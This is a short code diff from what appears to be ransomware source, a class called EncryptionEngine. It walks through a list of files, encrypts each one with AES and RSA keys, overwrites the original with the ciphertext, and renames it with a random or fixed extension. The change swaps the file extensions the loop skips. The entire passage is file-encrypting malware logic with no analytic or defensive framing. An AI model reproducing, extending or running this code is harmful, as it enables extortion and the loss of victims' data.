@@ -44,7 +44,7 @@ public class EncryptionEngine
 			String enumerateFile = (String)files.get(i);
 			try
 			{
-				if (!enumerateFile.endsWith(".hannah") && !enumerateFile.endsWith(".monica"))
+				if (!enumerateFile.endsWith(".emmy") && !enumerateFile.endsWith(".clubpenguin"))
 				{
 					File.WriteAllText(enumerateFile, JsonConvert.SerializeObject(EncryptionEngine.Encrypt_File_AESRSA(File.ReadAllBytes(enumerateFile), RSA_Public_Key, EncryptionEngine.Generate_AES_Key())));
 					String destFileName = enumerateFile + (EncryptionEngine.RNG.Next(2) == 0 ? "." + EncryptionEngine.RandomString(0, 10) : ".monica");
